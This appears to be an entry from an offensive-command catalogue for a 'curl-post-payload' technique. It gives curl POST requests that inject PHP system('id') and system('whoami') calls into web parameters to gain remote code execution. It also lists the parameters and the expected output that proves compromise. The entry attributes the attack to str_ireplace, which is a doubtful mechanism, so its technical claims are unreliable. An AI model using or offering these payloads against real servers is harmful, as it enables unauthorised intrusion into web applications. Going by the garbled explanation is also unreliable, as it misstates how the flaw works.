---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -X POST http://target.com/vulnerable-endpoint -d
  "input_param=<?=system('id')?>&replace_pattern=case_insensitive_trigger"
name: curl-post-payload
tags:
  - web
  - exploit
  - rce
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:28:20.101Z'
verified: false
validated: true
submitted: true
---
# curl-post-payload

## Command

```bash
curl -X POST http://target.com/vulnerable-endpoint -d "input_param=<?=system('id')?>&replace_pattern=case_insensitive_trigger"
```

## Description

This command uses curl to send a POST request to a vulnerable PHP endpoint, injecting a payload that exploits the str_ireplace function for remote code execution. It executes a simple 'id' command to demonstrate compromise.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `http://target.com/vulnerable-endpoint` | Target URL | Yes |
| `-d` | Data payload for the request | Yes |
| `input_param=<?=system('id')?>&replace_pattern=case_insensitive_trigger` | Malicious input exploiting str_ireplace | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target.com/search -d "query=<?=system('id')?>&filter=trigger"
```

### Advanced Usage

```bash
curl -X POST http://target.com/search -d "query=<?=system('whoami')?>&filter=case_insensitive" -H "User-Agent: Mozilla/5.0"
```

## Expected Output

Successful execution returns server response including command output, e.g., "uid=33(www-data) gid=33(www-data) groups=33(www-data)" embedded in the HTML or error message, indicating RCE.

## Related

- [[Related Procedure|procedures/Exploit-PHP-str_ireplace-RCE]]
